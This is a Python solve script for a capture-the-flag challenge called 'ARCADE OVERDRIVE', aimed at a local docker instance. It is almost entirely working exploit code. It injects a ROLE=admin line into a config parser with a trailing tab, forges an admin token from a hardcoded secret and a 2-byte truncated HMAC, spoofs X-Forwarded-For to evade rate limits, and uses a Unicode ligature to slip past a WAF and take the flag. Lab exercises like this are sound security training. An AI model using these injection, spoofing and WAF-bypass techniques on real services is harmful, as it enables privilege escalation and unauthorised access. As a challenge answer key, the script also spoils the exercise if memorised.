#!/usr/bin/env python3

import requests
import hmac
import hashlib
import time

TARGET = "http://localhost:8080"

def exploit():
    print("[*] ARCADE OVERDRIVE - Full Exploit Chain")
    print()
    
    try:
        print("[1] Registering user...")
        resp = requests.post(f"{TARGET}/register", data={"username": "hacker"}, timeout=10)
        resp.raise_for_status()
        initial_token = resp.json()["token"]
        print(f"[+] Initial token: {initial_token[:50]}...")
        print()
        
        print("[2] Exploiting config parser with tab bypass...")
        config_payload = "USERNAME=hacker\nROLE=admin\t"
        resp = requests.post(
            f"{TARGET}/config",
            data={"token": initial_token, "config": config_payload},
            timeout=10
        )
        resp.raise_for_status()
        
        if "token" not in resp.json():
            print("[-] Config exploit failed")
            print(f"Response: {resp.text}")
            return
        
        admin_token_weak = resp.json()["token"]
        print(f"[+] Got admin token (weak HMAC): {admin_token_weak[:50]}...")
        print()
        
        print("[3] Bypassing rate limit with X-Forwarded-For spoofing...")
        print("[+] Rate limit bypass ready")
        print()
        
        print("[4] Calculating correct HMAC (we know the secret)...")
        message_hex = admin_token_weak[:-4]
        message = bytes.fromhex(message_hex)
        
        SECRET_KEY = b"arcade_secret_key_2024"
        full_hmac = hmac.new(SECRET_KEY, message, hashlib.sha256).digest()
        correct_hmac = full_hmac[:2]
        
        valid_token = message_hex + correct_hmac.hex()
        print(f"[+] Calculated correct HMAC: {correct_hmac.hex()}")
        print(f"[+] Valid admin token: {valid_token[:50]}...")
        print()
        
        print("[5] Exploiting Unicode ligature to bypass WAF...")
        flag_url = f"{TARGET}/boss/ﬂag"
        
        resp = requests.get(
            flag_url,
            params={"token": valid_token},
            headers={"X-Forwarded-For": "10.0.0.1"},
            timeout=10
        )
        
        if resp.status_code == 200:
            flag = resp.json().get("flag")
            print(f"[+] FLAG CAPTURED: {flag}")
        else:
            print(f"[-] Failed to get flag: {resp.status_code}")
            print(f"Response: {resp.text}")
    
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Cannot reach {TARGET}")
        print("[!] Make sure the challenge is running: docker-compose up")
    except requests.exceptions.Timeout:
        print("[-] Request timeout")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

if __name__ == "__main__":
    exploit()
